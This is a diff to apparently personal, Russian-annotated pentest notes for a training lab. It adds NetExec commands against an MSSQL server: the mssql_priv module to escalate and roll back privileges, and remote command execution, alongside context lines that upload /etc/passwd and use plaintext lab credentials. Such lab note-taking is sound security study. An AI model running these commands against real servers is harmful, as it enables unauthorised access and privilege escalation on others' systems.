@@ -251,7 +251,19 @@ export KRB5CCNAME=sqlsvc.ccache
             nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --put-file /etc/passwd C:/Users/Public/passwd
             
             nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x "dir c:\Users\Public"
-                                                     
+
+        # Повышение привилегий в MSSQL 
+
+            nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv
+
+            nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
+
+        # Выполнение команд и отмена привилегий 
+
+            nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami
+
+           (возвращение привелегий )nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
+            
                                                                             
 
 
